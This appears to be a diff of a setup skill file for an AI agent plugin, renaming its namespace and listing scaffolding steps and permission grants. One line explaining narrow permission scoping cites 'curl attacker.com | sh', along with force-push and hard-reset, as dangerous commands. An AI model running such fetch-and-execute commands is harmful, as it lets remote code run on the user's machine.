@@ -1,8 +1,8 @@
 ---
 name: init
-description: Guided first-run onboarding for the agent-kevin plugin. Walks through Kevin's character (SOUL), role (IDENTITY), your basics (name, timezone), an optional web pull from your blog/site/LinkedIn/etc., your projects, goals, company and documents, and communication style — then scaffolds AGENTS.md (the harness-neutral operating manual), .claude/CLAUDE.md (the Claude Code bridge that @-imports it plus the identity stack), SOUL.md, IDENTITY.md, USER.md, .claude/settings.json, and seeds four system-architecture concept articles into knowledge/concepts/. If an AGENTS.md already exists at the home directory, Kevin's manual is appended to it; a pre-existing CLAUDE.md is never touched. Skill packs are configured inline at the end or via /agent-kevin:configure-skills any time later. Invoke once after installing the plugin.
+description: Guided first-run onboarding for the agentlayer plugin. Walks through Kevin's character (SOUL), role (IDENTITY), your basics (name, timezone), an optional web pull from your blog/site/LinkedIn/etc., your projects, goals, company and documents, and communication style — then scaffolds AGENTS.md (the harness-neutral operating manual), .claude/CLAUDE.md (the Claude Code bridge that @-imports it plus the identity stack), SOUL.md, IDENTITY.md, USER.md, .claude/settings.json, and seeds four system-architecture concept articles into knowledge/concepts/. If an AGENTS.md already exists at the home directory, Kevin's manual is appended to it; a pre-existing CLAUDE.md is never touched. Skill packs are configured inline at the end or via /agentlayer:configure-skills any time later. Invoke once after installing the plugin.
 disable-model-invocation: true
-allowed-tools: Read, Write, Edit, AskUserQuestion, WebFetch, mcp__plugin_agent-kevin_kevin__codex_setup, mcp__plugin_agent-kevin_kevin__home_history, mcp__plugin_agent-kevin_kevin__run_upgrade, Bash(mkdir *), Bash(cp *), Bash(cat *), Bash(ls *), Bash(find *), Bash(git config *), Bash(readlink *), Bash(uname *), Bash(date *), Bash(echo *), Bash(test *), Bash([ *), Bash(grep *), Bash(printf *), Bash(sed *), Bash(bun *), Bash(unzip -l *)
+allowed-tools: Read, Write, Edit, AskUserQuestion, WebFetch, mcp__plugin_agentlayer_agent__codex_setup, mcp__plugin_agentlayer_agent__home_history, mcp__plugin_agentlayer_agent__run_upgrade, Bash(mkdir *), Bash(cp *), Bash(cat *), Bash(ls *), Bash(find *), Bash(git config *), Bash(readlink *), Bash(uname *), Bash(date *), Bash(echo *), Bash(test *), Bash([ *), Bash(grep *), Bash(printf *), Bash(sed *), Bash(bun *), Bash(unzip -l *)
 ---
 
 > Operator-invoked only. Run this when the operator named this skill, or when a skill the operator invoked calls for it as a documented step; otherwise stop and ask before doing anything. Claude Code enforces this through the frontmatter above, Codex through `agents/openai.yaml`; this line is the backstop for any host that reads neither.
@@ -20,7 +20,7 @@ that name in this file, and they are not treated the same:
   `AGENTS.md`, uses `<AGENT_NAME>` from Step 1b. Where the prose below says "Kevin" in
   a sentence addressed to the operator, substitute it. Before Step 1b the name isn't
   known yet, so say "your agent" rather than guessing.
-- **The plugin.** `agent-kevin`, `/agent-kevin:*`, `.state/`,
+- **The plugin.** `agentlayer`, `/agentlayer:*`, `.state/`,
   `kevin-avatar.jpg`. These are the product and its namespace, not the
   persona. They stay exactly as written no matter what the operator picks.
 
@@ -54,7 +54,7 @@ Act on the probes before anything else:
 - **`CWD_IS_A_REPO`** — cwd is inside a git work tree that isn't a Kevin home: almost certainly a code repo, and scaffolding a brain into a repo pollutes it (SOUL.md, knowledge/, `.state/` all land in the working tree). `AskUserQuestion`:
 
   > **This looks like a code repo, not a home for Kevin's brain.** You launched `claude` in `<HOME_DIR>`, which is a git repository without a Kevin scaffold. Where should the home live?
-  > - **`~/Documents/Agents/<AgentName>` (recommended)** — exit, `mkdir -p` it, relaunch `claude` there, re-run `/agent-kevin:init`
+  > - **`~/Documents/Agents/<AgentName>` (recommended)** — exit, `mkdir -p` it, relaunch `claude` there, re-run `/agentlayer:init`
   > - **Here anyway** — I understand the scaffold lands inside this repo
 
   On the recommended pick, print the exact `mkdir -p ~/Documents/Agents/<AgentName> && cd ~/Documents/Agents/<AgentName> && claude` line and **STOP** — the rest of the wizard runs in the relaunched session. Only "Here anyway" continues.
@@ -84,7 +84,7 @@ Carry `$AGENT_PLATFORM` and `$PLATFORM_LABEL` through the rest of the walk.
 
 **Resolve the plugin checkout.** `$PLUGIN_ROOT` is the directory this skill loaded from: two levels above the skill's base directory (the `Base directory for this skill:` line under Claude Code, the `<skill>` block's `<path>` under Codex). Under Claude Code that is the same path as `${CLAUDE_PLUGIN_ROOT}`; wherever a later step says `${CLAUDE_PLUGIN_ROOT}`, use `$PLUGIN_ROOT`.
 
-**Check prerequisites — bail early if a show-stopper is missing.** Kevin's MCP server, all four hooks, and the CLI launch via `bun`, so it's a hard requirement; `git` backs the version-controlled knowledge tree, the session git-activity context, and worktrees. `python3` is **optional but recommended** — Kevin is TypeScript-first, but some tooling and integrations still reach for Python, so having it on PATH avoids friction later. `uv` is **recommended** alongside it: the manual runs Python scripts through `uv run --with <packages>`, and without `uv` the agent is left with `pip`, which the Python guard below denies. On macOS both `git` and `python3` come with the Xcode Command Line Tools (`xcode-select --install`); neither needs Homebrew. `gh` is **conditional**: nothing else uses it, but every GitHub-pack tool shells out to it — including `github_fast_forward`, which is what keeps the code checkouts current during `/agent-kevin:sync`. It is not bundled with Claude Code or this plugin, so on macOS it means Homebrew (`brew install gh`) and on Windows winget (`winget install --id GitHub.cli`). Probing it here turns a mid-session throw into a note the operator can act on before they tick the pack. `poppler` is **optional** as well: the Read tool renders PDF pages through its `pdftoppm` binary, so install it (macOS `brew install poppler`, Linux `poppler-utils`, Windows `winget install --id oschwartz10612.Poppler`) if you want Kevin to read PDF files. On **native Windows**, Kevin runs through **Git Bash** (the shell Claude Code uses for its Bash tool) — that's the supported Windows path and supplies the POSIX environment Kevin's commands assume; **WSL2** also works if you prefer a full Linux userland.
+**Check prerequisites — bail early if a show-stopper is missing.** Kevin's MCP server, all four hooks, and the CLI launch via `bun`, so it's a hard requirement; `git` backs the version-controlled knowledge tree, the session git-activity context, and worktrees. `python3` is **optional but recommended** — Kevin is TypeScript-first, but some tooling and integrations still reach for Python, so having it on PATH avoids friction later. `uv` is **recommended** alongside it: the manual runs Python scripts through `uv run --with <packages>`, and without `uv` the agent is left with `pip`, which the Python guard below denies. On macOS both `git` and `python3` come with the Xcode Command Line Tools (`xcode-select --install`); neither needs Homebrew. `gh` is **conditional**: nothing else uses it, but every GitHub-pack tool shells out to it — including `github_fast_forward`, which is what keeps the code checkouts current during `/agentlayer:sync`. It is not bundled with Claude Code or this plugin, so on macOS it means Homebrew (`brew install gh`) and on Windows winget (`winget install --id GitHub.cli`). Probing it here turns a mid-session throw into a note the operator can act on before they tick the pack. `poppler` is **optional** as well: the Read tool renders PDF pages through its `pdftoppm` binary, so install it (macOS `brew install poppler`, Linux `poppler-utils`, Windows `winget install --id oschwartz10612.Poppler`) if you want Kevin to read PDF files. On **native Windows**, Kevin runs through **Git Bash** (the shell Claude Code uses for its Bash tool) — that's the supported Windows path and supplies the POSIX environment Kevin's commands assume; **WSL2** also works if you prefer a full Linux userland.
 
 ```bash
 # Probe FUNCTIONALLY, never with `command -v`. On macOS /usr/bin/git and
@@ -128,7 +128,7 @@ Act on the result **before** anything else:
 
 - **`XCODE_CLT_MISSING`** — the Xcode Command Line Tools aren't installed, which on a Mac is the usual root cause behind a failing `git` (and `python3`). Surface this **instead of** the generic git line when both fired, since `xcode-select --install` fixes it and a git-scm.com download is the wrong advice:
 
-  > 🛑 **Xcode Command Line Tools aren't installed.** On macOS this is what provides `git` and `python3`. Run this, click through the installer (~10 min), then re-run `/agent-kevin:init`:
+  > 🛑 **Xcode Command Line Tools aren't installed.** On macOS this is what provides `git` and `python3`. Run this, click through the installer (~10 min), then re-run `/agentlayer:init`:
   >
   > ```bash
   > xcode-select --install
@@ -142,7 +142,7 @@ Act on the result **before** anything else:
   >
   > `<each MISSING line>`
   >
-  > Install them, then re-run `/agent-kevin:init` — it's idempotent and picks up where you left off.
+  > Install them, then re-run `/agentlayer:init` — it's idempotent and picks up where you left off.
 
 - **`DEPS_MISSING`** (and `bun` not in `MISSING`) — the plugin's packages were never installed, which is the normal state after `/plugin install` from a marketplace. Say *"Installing the plugin's packages (~150 MB, most of it the browser the web tools use); this can take a few minutes."*, then call `run_upgrade` with `{ install: true, pluginRoot: "<PLUGIN_ROOT>" }`, the real path substituted. It runs `bun install` from the plugin's server, outside the sandbox, which can't write to the plugin folder. On `ok: true`, continue: the relaunch at the end of init loads the installed packages, and the browser tools work from then on. On `ok: false`, or when `run_upgrade` isn't available (the server didn't connect), show its `message` and `stderr` if any, substitute the real `${CLAUDE_PLUGIN_ROOT}` path below, and **STOP**:
 
@@ -152,7 +152,7 @@ Act on the result **before** anything else:
   > cd "<PLUGIN_ROOT>" && bun install
   > ```
   >
-  > Then `/exit`, relaunch from this folder, and run `/agent-kevin:init` again. The relaunch is what connects the plugin's server.
+  > Then `/exit`, relaunch from this folder, and run `/agentlayer:init` again. The relaunch is what connects the plugin's server.
 
 - **Nothing missing** — surface any optional `NOTE`s (if present) as one-line FYIs and continue.
 
@@ -228,9 +228,9 @@ Then below the banner, plain prose (no leading whitespace, no numbered lists —
 
 ## Step 1b — Name the agent
 
-The plugin is called `agent-kevin`, but the agent it scaffolds does not have to be
+The plugin is called `agentlayer`, but the agent it scaffolds does not have to be
 called Kevin. The **display name** (what it calls itself, what the dashboard renders,
-how you address it) is pure data in `IDENTITY.md`. The **namespace** (`/agent-kevin:`
+how you address it) is pure data in `IDENTITY.md`. The **namespace** (`/agentlayer:`
 commands, the `.state/` data dir, MCP tool names) comes from the
 plugin manifest and stays put either way. Renaming costs nothing and breaks nothing.
 
@@ -284,17 +284,17 @@ newlines break the parse on the way back out. One allowlist closes all of them w
 anyone having to remember which character breaks which stage.
 
 Everything downstream keys off `AGENT_NAME`: it fills `{{AGENT_NAME}}` in every
-template, and `/agent-kevin:upgrade` reads it back out of `IDENTITY.md` on every future
+template, and `/agentlayer:upgrade` reads it back out of `IDENTITY.md` on every future
 update so template changes arrive phrased in this agent's name instead of proposing
 "Kevin" back. An operator can also change their mind later with
-`/agent-kevin:rename-agent`.
+`/agentlayer:rename-agent`.
 
 ---
 
 ## Step 1c — Starting from a seed bundle?
 
 If the operator mentioned a seed bundle when invoking init (a `*-seed.zip` from a
-teammate's `/agent-kevin:seed export` or the AgentLayer website wizard), or you want to
+teammate's `/agentlayer:seed export` or the AgentLayer website wizard), or you want to
 offer it, ask:
 
 > **Do you have a seed bundle from a teammate?**
@@ -474,7 +474,7 @@ Sort URLs by their inferred type — Kevin decides which facet each lands in bas
 - Durable facts only — no transient news items, current events, etc.
 - 404 / paywall / fetch error: note it in the log, skip that URL, continue with the rest
 
-**Do not** ask the user to confirm the synthesised content. Stage it and continue — the user can edit any `knowledge/user/*.md` file later, or re-run `/agent-kevin:knowledge-compile` to regenerate.
+**Do not** ask the user to confirm the synthesised content. Stage it and continue — the user can edit any `knowledge/user/*.md` file later, or re-run `/agentlayer:knowledge-compile` to regenerate.
 
 ---
 
@@ -538,7 +538,7 @@ Ask in plain chat (not `AskUserQuestion`, the answers are freeform), one message
 Parse the reply leniently and stage, without writing yet (Step 7 writes them after the scaffold, never over an existing file at the same path):
 
 - **Projects** → one `<PROJECTS>/<slug>/README.md` and `tasks/` each, using the README template in `${CLAUDE_PLUGIN_ROOT}/skills/project/references/playbooks/create.md` step 3 (read it; don't restate it here). Naming them here is the operator's go, so skip that skill's confirmation. Derive each slug and prefix the way it says, and fill Current Focus from anything the operator said about the project.
-- **Goals** → `<KNOWLEDGE>/concepts/roadmap-draft.md`, a `| When | Milestone |` table, noting that `/agent-kevin:roadmap` renders it into `roadmap.html`.
+- **Goals** → `<KNOWLEDGE>/concepts/roadmap-draft.md`, a `| When | Milestone |` table, noting that `/agentlayer:roadmap` renders it into `roadmap.html`.
 - **Company** → `<KNOWLEDGE>/concepts/company-profile.md`: company, website, what it does, the operator's role. `WebFetch` the website (public pages only, the Step 5 rules) and add what it says about the company, citing the URL.
 
 Both concept files get the permanent-article frontmatter (`title`, `sources`, `created`, `updated`) and a line each under `## Concepts` in `knowledge/index.md`.
@@ -558,7 +558,7 @@ On `done`, `ls` the inbox and `Read` each file (PDF pages render through poppler
 - **About the company** → the staged `company-profile.md`, citing the file.
 - **Anything else** → leave it for the first compile.
 
-Leave every file in the inbox either way: the first `/agent-kevin:knowledge-compile` absorbs them in full and archives them. Count them for Step 9.
+Leave every file in the inbox either way: the first `/agentlayer:knowledge-compile` absorbs them in full and archives them. Count them for Step 9.
 
 ---
 
@@ -647,7 +647,7 @@ mkdir -p "$KNOWLEDGE_ROOT"/{user/assets,concepts,memory,raw/{sessions,user,inbox
 mkdir -p "$PROJECTS_ROOT" "$REPORTS_ROOT"
 ```
 
-**Record the template baseline.** Write `$HOME_DIR/.state/version.json` stamping the plugin version this home was scaffolded from, and the plugin that owns it: `.state` is a name every agent shares, so the runtime only treats it as this agent's home once `plugin` names this plugin. This is the anchor the SessionStart banner + dashboard use to detect pending HOME migrations, and the "from" point `/agent-kevin:upgrade` reconciles from. A fresh home equals the installed version, so it starts `current` (never falsely flagged). **Skip the write if the file already exists** (a re-init must not reset an upgrade-tracked baseline).
+**Record the template baseline.** Write `$HOME_DIR/.state/version.json` stamping the plugin version this home was scaffolded from, and the plugin that owns it: `.state` is a name every agent shares, so the runtime only treats it as this agent's home once `plugin` names this plugin. This is the anchor the SessionStart banner + dashboard use to detect pending HOME migrations, and the "from" point `/agentlayer:upgrade` reconciles from. A fresh home equals the installed version, so it starts `current` (never falsely flagged). **Skip the write if the file already exists** (a re-init must not reset an upgrade-tracked baseline).
 
 ```bash
 VERSION_FILE="$HOME_DIR/.state/version.json"
@@ -669,7 +669,7 @@ CADENCE_FILE="$HOME_DIR/.state/cadence.json"
 [ -f "$CADENCE_FILE" ] || printf '{\n  "welcome": "pending"\n}\n' > "$CADENCE_FILE"
 ```
 
-Note: do **not** create `.claude/skills/` here. Third-party skill libraries are installed via `/agent-kevin:configure-skills` after the user relaunches.
+Note: do **not** create `.claude/skills/` here. Third-party skill libraries are installed via `/agentlayer:configure-skills` after the user relaunches.
 
 Copy the agent's avatar into `assets/`, the home's media folder, where `IDENTITY.md` links it.
 
@@ -812,9 +812,9 @@ Two records inside `.state/` must survive a clone or restore, so we un-ignore th
 bun "$PLUGIN_ROOT/skills/init/scripts/home-baseline.ts" --home "$HOME_DIR" --write
 ```
 
-With no `.gitignore` it copies the template. Over an existing one it appends each template rule the home lacks under `# agent-kevin`, places every `!` negation after the rule it carves out of (git can't re-include a file whose parent dir is ignored), and rewrites a bare `.state/` in place to the template's `.state/*`. The operator's other lines are never removed or reordered. The same run records this plugin in `.state/version.json` (`plugin`), which is how the runtime tells this agent's data dir from a sibling's. Every upgrade that applies a release runs the same script, so a home that drifts converges.
+With no `.gitignore` it copies the template. Over an existing one it appends each template rule the home lacks under `# agentlayer`, places every `!` negation after the rule it carves out of (git can't re-include a file whose parent dir is ignored), and rewrites a bare `.state/` in place to the template's `.state/*`. The operator's other lines are never removed or reordered. The same run records this plugin in `.state/version.json` (`plugin`), which is how the runtime tells this agent's data dir from a sibling's. Every upgrade that applies a release runs the same script, so a home that drifts converges.
 
-Write project settings so the plugin auto-loads on subsequent launches AND the **always-on core** MCP tools are pre-granted (no per-call confirm prompts). Pack-gated tools are NOT granted here — they land in `permissions.allow` only when the matching `configure-skills` walk runs (Step 8 inline or `/agent-kevin:configure-skills` later).
+Write project settings so the plugin auto-loads on subsequent launches AND the **always-on core** MCP tools are pre-granted (no per-call confirm prompts). Pack-gated tools are NOT granted here — they land in `permissions.allow` only when the matching `configure-skills` walk runs (Step 8 inline or `/agentlayer:configure-skills` later).
 
 - `$HOME_DIR/.claude/settings.json` ← JSON below.
 
@@ -855,7 +855,7 @@ Write project settings so the plugin auto-loads on subsequent launches AND the *
 
 The bigger privacy setting lives in the operator's Claude account, not a file. On Free, Pro and Max, Anthropic trains on chats and Claude Code sessions unless the operator turns it off, and keeps them up to 5 years instead of 30 days: claude.ai → their name → Settings → Privacy → **Help improve Claude** → off (the same path in the mobile app). Team, Enterprise and API accounts aren't trained on unless the organization opts in. Step 9 reminds them.
 
-**`statusLine` — the footer, the Claude side of the Codex `[tui]` table.** Kevin renders it (`kevin statusline`: model, folder, branch on line one; context bar, cost with the hourly rate, session time, and the Pro/Max rate-limit windows on line two). The command names this checkout, so it goes in `settings.local.json`, never the shared file; never type it — generate it and merge the object it prints:
+**`statusLine` — the footer, the Claude side of the Codex `[tui]` table.** Kevin renders it (`agentlayer statusline`: model, folder, branch on line one; context bar, cost with the hourly rate, session time, and the Pro/Max rate-limit windows on line two). The command names this checkout, so it goes in `settings.local.json`, never the shared file; never type it — generate it and merge the object it prints:
 
 ```bash
 bun "$PLUGIN_ROOT/src/cli.ts" statusline --setting
@@ -986,9 +986,9 @@ Baseline `permissions.ask` — **always written** (unioned with whatever the ope
   "Bash(gh pr create *)",
   "Bash(gh pr merge *)",
   "Bash(gh release create *)",
-  "mcp__plugin_agent-kevin_kevin__curl_run",
-  "mcp__plugin_agent-kevin_kevin__github_pr_create",
-  "mcp__plugin_agent-kevin_kevin__seed_import"
+  "mcp__plugin_agentlayer_agent__curl_run",
+  "mcp__plugin_agentlayer_agent__github_pr_create",
+  "mcp__plugin_agentlayer_agent__seed_import"
 ]
 ```
 
@@ -1187,70 +1187,70 @@ Concrete approach: `Read` the existing file (treat as `{}` if absent), build the
       "Bash(mkdir -p *)",
       "Bash(readlink *)",
       "Bash(test *)",
-      "mcp__plugin_agent-kevin_kevin__capture",
-      "mcp__plugin_agent-kevin_kevin__codex_setup",
-      "mcp__plugin_agent-kevin_kevin__compile_next",
-      "mcp__plugin_agent-kevin_kevin__compile_status",
-      "mcp__plugin_agent-kevin_kevin__compile_write",
-      "mcp__plugin_agent-kevin_kevin__dashboard",
-      "mcp__plugin_agent-kevin_kevin__attention_write",
-      "mcp__plugin_agent-kevin_kevin__home_history",
-      "mcp__plugin_agent-kevin_kevin__knowledge_lint",
-      "mcp__plugin_agent-kevin_kevin__links_rewrite",
-      "mcp__plugin_agent-kevin_kevin__memory_prune",
-      "mcp__plugin_agent-kevin_kevin__ping",
-      "mcp__plugin_agent-kevin_kevin__report_write",
-      "mcp__plugin_agent-kevin_kevin__run_upgrade",
-      "mcp__plugin_agent-kevin_kevin__seed_export",
-      "mcp__plugin_agent-kevin_kevin__seed_scan",
-      "mcp__plugin_agent-kevin_kevin__setup_worktree",
-      "mcp__plugin_agent-kevin_kevin__task_close",
-      "mcp__plugin_agent-kevin_kevin__task_create",
-      "mcp__plugin_agent-kevin_kevin__task_get",
-      "mcp__plugin_agent-kevin_kevin__task_query",
-      "mcp__plugin_agent-kevin_kevin__task_scan",
-      "mcp__plugin_agent-kevin_kevin__task_thread",
-      "mcp__plugin_agent-kevin_kevin__task_update",
-      "mcp__plugin_agent-kevin_kevin__video_frames",
-      "mcp__plugin_agent-kevin_kevin__media_transcribe",
-      "Skill(agent-kevin:adversarial-review)",
-      "Skill(agent-kevin:api-collections)",
-      "Skill(agent-kevin:briefing)",
-      "Skill(agent-kevin:browser-flows)",
-      "Skill(agent-kevin:configure-skills)",
-      "Skill(agent-kevin:dashboard)",
-      "Skill(agent-kevin:engineer)",
-      "Skill(agent-kevin:find-session)",
-      "Skill(agent-kevin:flywheel)",
-      "Skill(agent-kevin:attention)",
-      "Skill(agent-kevin:goals)",
-      "Skill(agent-kevin:guide)",
-      "Skill(agent-kevin:helpdesk)",
-      "Skill(agent-kevin:history)",
-      "Skill(agent-kevin:humanizer)",
-      "Skill(agent-kevin:itinerary)",
-      "Skill(agent-kevin:knowledge-compile)",
-      "Skill(agent-kevin:media)",
-      "Skill(agent-kevin:mermaid)",
-      "Skill(agent-kevin:plan-spec)",
-      "Skill(agent-kevin:project)",
-      "Skill(agent-kevin:release)",
-      "Skill(agent-kevin:roadmap)",
-      "Skill(agent-kevin:seed)",
-      "Skill(agent-kevin:self-review)",
-      "Skill(agent-kevin:seo)",
-      "Skill(agent-kevin:setup-worktree)",
-      "Skill(agent-kevin:slack)",
-      "Skill(agent-kevin:sync)",
-      "Skill(agent-kevin:tax)",
-      "Skill(agent-kevin:upgrade)",
-      "Skill(agent-kevin:wordpress-rest)"
+      "mcp__plugin_agentlayer_agent__capture",
+      "mcp__plugin_agentlayer_agent__codex_setup",
+      "mcp__plugin_agentlayer_agent__compile_next",
+      "mcp__plugin_agentlayer_agent__compile_status",
+      "mcp__plugin_agentlayer_agent__compile_write",
+      "mcp__plugin_agentlayer_agent__dashboard",
+      "mcp__plugin_agentlayer_agent__attention_write",
+      "mcp__plugin_agentlayer_agent__home_history",
+      "mcp__plugin_agentlayer_agent__knowledge_lint",
+      "mcp__plugin_agentlayer_agent__links_rewrite",
+      "mcp__plugin_agentlayer_agent__memory_prune",
+      "mcp__plugin_agentlayer_agent__ping",
+      "mcp__plugin_agentlayer_agent__report_write",
+      "mcp__plugin_agentlayer_agent__run_upgrade",
+      "mcp__plugin_agentlayer_agent__seed_export",
+      "mcp__plugin_agentlayer_agent__seed_scan",
+      "mcp__plugin_agentlayer_agent__setup_worktree",
+      "mcp__plugin_agentlayer_agent__task_close",
+      "mcp__plugin_agentlayer_agent__task_create",
+      "mcp__plugin_agentlayer_agent__task_get",
+      "mcp__plugin_agentlayer_agent__task_query",
+      "mcp__plugin_agentlayer_agent__task_scan",
+      "mcp__plugin_agentlayer_agent__task_thread",
+      "mcp__plugin_agentlayer_agent__task_update",
+      "mcp__plugin_agentlayer_agent__video_frames",
+      "mcp__plugin_agentlayer_agent__media_transcribe",
+      "Skill(agentlayer:adversarial-review)",
+      "Skill(agentlayer:api-collections)",
+      "Skill(agentlayer:briefing)",
+      "Skill(agentlayer:browser-flows)",
+      "Skill(agentlayer:configure-skills)",
+      "Skill(agentlayer:dashboard)",
+      "Skill(agentlayer:engineer)",
+      "Skill(agentlayer:find-session)",
+      "Skill(agentlayer:flywheel)",
+      "Skill(agentlayer:attention)",
+      "Skill(agentlayer:goals)",
+      "Skill(agentlayer:guide)",
+      "Skill(agentlayer:helpdesk)",
+      "Skill(agentlayer:history)",
+      "Skill(agentlayer:humanizer)",
+      "Skill(agentlayer:itinerary)",
+      "Skill(agentlayer:knowledge-compile)",
+      "Skill(agentlayer:media)",
+      "Skill(agentlayer:mermaid)",
+      "Skill(agentlayer:plan-spec)",
+      "Skill(agentlayer:project)",
+      "Skill(agentlayer:release)",
+      "Skill(agentlayer:roadmap)",
+      "Skill(agentlayer:seed)",
+      "Skill(agentlayer:self-review)",
+      "Skill(agentlayer:seo)",
+      "Skill(agentlayer:setup-worktree)",
+      "Skill(agentlayer:slack)",
+      "Skill(agentlayer:sync)",
+      "Skill(agentlayer:tax)",
+      "Skill(agentlayer:upgrade)",
+      "Skill(agentlayer:wordpress-rest)"
     ]
   }
 }
 ```
 
-**Why no `extraKnownMarketplaces` entry?** The marketplace registration was already saved to the user's global `~/.claude/settings.json` when they first ran `/plugin marketplace add` (Option A) or were prompted to trust the marketplace (Option B). Duplicating it in the home is redundant — only `enabledPlugins` is needed to opt this specific home into agent-kevin, and it goes in `settings.local.json` (below), since the marketplace it names differs between a clone and a marketplace install.
+**Why no `extraKnownMarketplaces` entry?** The marketplace registration was already saved to the user's global `~/.claude/settings.json` when they first ran `/plugin marketplace add` (Option A) or were prompted to trust the marketplace (Option B). Duplicating it in the home is redundant — only `enabledPlugins` is needed to opt this specific home into agentlayer, and it goes in `settings.local.json` (below), since the marketplace it names differs between a clone and a marketplace install.
 
 **Why only the always-on core is granted here.** Plugin-bundled MCP tools register into the session regardless of permissions — `permissions.allow` only controls whether tool calls trigger a confirm prompt. The "always-on core" (`ping`, `capture`, `compile_*`, `knowledge_lint`, `task_*`, `links_rewrite`, `memory_prune`, `report_write`, `dashboard`, `attention_write`, `home_history`, `setup_worktree`, `video_frames`, `media_transcribe`, `run_upgrade`, `codex_setup`, `seed_scan`, `seed_export`) needs no external config; the pack-gated tools need API keys or OAuth that only get set when the user opts into the matching pack. Granting them at init time would mean `settings.json` advertises packs the user never configured. Conditional grants keep `settings.json` an accurate audit trail.
 
@@ -1269,7 +1269,7 @@ Concrete approach: `Read` the existing file (treat as `{}` if absent), build the
 | App Store-gated | `appstore_reviews` | configure-skills A.2h (App Store walk) |
 | Slack-gated | `slack_*`, `WebFetch(domain:slack.com)` | configure-skills A.2i (Slack walk, which also runs the OAuth sign-in) |
 
-The allow list also carries a **skill** grant for every skill but two. Skills register regardless of permissions: the grant only suppresses the confirm prompt on model invocation (whether Kevin auto-fires the skill or one skill invokes another through the Skill tool). Every skill is model-invocable except `init`, `release` and `rename-agent`, so the operator asks in plain words ("brief me", "set today's goals", "how's my site ranking", "review 142") and never has to remember a slash name. The playbook skills route inside themselves: `briefing` (morning, evening, pulse), `goals` (day, week, month, year), `seo` (audit, console, speed, serp, rank), `seed` (export, import), `project` (create, archive), `attention` and `engineer`. A skill that writes still asks before it writes: `seed` import's `seed_import` tool sits in `ask`, `project` confirms before creating or archiving, and `configure-skills`, `self-review` and the goals interviews confirm each change. A pack skill that fires on a home without its keys stops at the first missing-key error and names the `/agent-kevin:configure-skills` walk that fixes it; `seo` spends SerpAPI credit only on an explicit SERP ask or an audit anomaly.
+The allow list also carries a **skill** grant for every skill but two. Skills register regardless of permissions: the grant only suppresses the confirm prompt on model invocation (whether Kevin auto-fires the skill or one skill invokes another through the Skill tool). Every skill is model-invocable except `init`, `release` and `rename-agent`, so the operator asks in plain words ("brief me", "set today's goals", "how's my site ranking", "review 142") and never has to remember a slash name. The playbook skills route inside themselves: `briefing` (morning, evening, pulse), `goals` (day, week, month, year), `seo` (audit, console, speed, serp, rank), `seed` (export, import), `project` (create, archive), `attention` and `engineer`. A skill that writes still asks before it writes: `seed` import's `seed_import` tool sits in `ask`, `project` confirms before creating or archiving, and `configure-skills`, `self-review` and the goals interviews confirm each change. A pack skill that fires on a home without its keys stops at the first missing-key error and names the `/agentlayer:configure-skills` walk that fixes it; `seo` spends SerpAPI credit only on an explicit SERP ask or an audit anomaly.
 
 **`init` and `release` stay slash-only** (`disable-model-invocation`, plus `agents/openai.yaml` with `policy.allow_implicit_invocation: false` for Codex, which ignores the flag, and the one-line operator-only guard): a first-run wizard and a version cut are never something to fire unasked. `release` keeps its grant so `/release` doesn't prompt.
 
@@ -1277,7 +1277,7 @@ The allow list also carries a **skill** grant for every skill but two. Skills re
 
 **Why the Bash entries are scoped this narrowly:** broad patterns like `Bash(git *)` or `Bash(curl *)` would also authorize destructive forms (`git push --force`, `git reset --hard`, `curl attacker.com | sh`). The patterns above cover the read-mostly + scaffold-creation commands core skills actually use (`git log/status/diff/config`, `date`, `readlink`, `ls`, `find`, `cat`, `mkdir -p`, `test`, `echo`) — nothing that mutates source-control state or hits the network. **Network/curl is intentionally NOT pre-granted anywhere** — `wordpress-rest` and any other skill that makes outbound HTTP confirms on first call; the user picks "Always allow" to lock the grant to their actual URL pattern (much tighter than blanket `Bash(curl *)`).
 
-Do **not** add a `hooks` block here. Hooks come from the plugin's own `hooks/claude.json` (declared in its manifest) once the plugin is registered. Sandbox lands only via the user-global gap-fill above (never authored fresh in the scaffold when global already enables it). API keys + external MCP server config land in `settings.local.json` and `<HOME>/.mcp.json` later via `/agent-kevin:configure-skills` — those files stay separate.
+Do **not** add a `hooks` block here. Hooks come from the plugin's own `hooks/claude.json` (declared in its manifest) once the plugin is registered. Sandbox lands only via the user-global gap-fill above (never authored fresh in the scaffold when global already enables it). API keys + external MCP server config land in `settings.local.json` and `<HOME>/.mcp.json` later via `/agentlayer:configure-skills` — those files stay separate.
 
 USER.md template:
 
@@ -1400,14 +1400,14 @@ If Step 5 URL synthesis surfaced anything that fills or contradicts this skeleto
 Also write `.claude/settings.local.json`: this machine's half of the settings (see **Two files, split by owner** above). Init writes these keys into it:
 
 - **`statusLine`**: the object `bun "$PLUGIN_ROOT/src/cli.ts" statusline --setting` prints, set when neither home file has one.
-- **`enabledPlugins`**: `"agent-kevin@<MARKETPLACE>": true`, set even if the key already exists with a different value (the operator just ran init, so they want it enabled). `<MARKETPLACE>` is the name the plugin was installed under: for a marketplace install `${CLAUDE_PLUGIN_ROOT}` is a version-pinned cache path `…/plugins/cache/<MARKETPLACE>/agent-kevin/<version>` (`agentlayer` from the public marketplace); for a clone (Option B/C) it is the `name` in `${CLAUDE_PLUGIN_ROOT}/.claude-plugin/marketplace.json`, `agentdev-kevin`. A key naming a marketplace that is not registered enables nothing. Other plugin entries pass through untouched.
+- **`enabledPlugins`**: `"agentlayer@<MARKETPLACE>": true`, set even if the key already exists with a different value (the operator just ran init, so they want it enabled). `<MARKETPLACE>` is the name the plugin was installed under: for a marketplace install `${CLAUDE_PLUGIN_ROOT}` is a version-pinned cache path `…/plugins/cache/<MARKETPLACE>/agent-kevin/<version>` (`agentlayer` from the public marketplace); for a clone (Option B/C) it is the `name` in `${CLAUDE_PLUGIN_ROOT}/.claude-plugin/marketplace.json`, `agentlayer-dev`. A key naming a marketplace that is not registered enables nothing. Other plugin entries pass through untouched.
 - **The code-root pair** from **Reaching the code tree** above, when `CODE_ROOT` is set: `permissions.additionalDirectories` and `sandbox.filesystem.allowWrite`, both `["<CODE_ROOT>"]`.
 - **The custom-folder grants** from Step 5c, when a path is outside the home.
 - **`env`**: `AGENT_HOME_TIMEZONE` from Step 4 (always written — the SessionStart hook compares it against the live machine timezone and flags the operator as traveling when they differ) and the **optional** primary-codebase pair from Step 4b, written only when a path was actually captured.
 
 Lists union with what the file already holds, deduped; existing scalars win except `enabledPlugins` as above. `Read` it first (treat as `{}` if absent) and `Write` the merged JSON, same as the shared file.
 
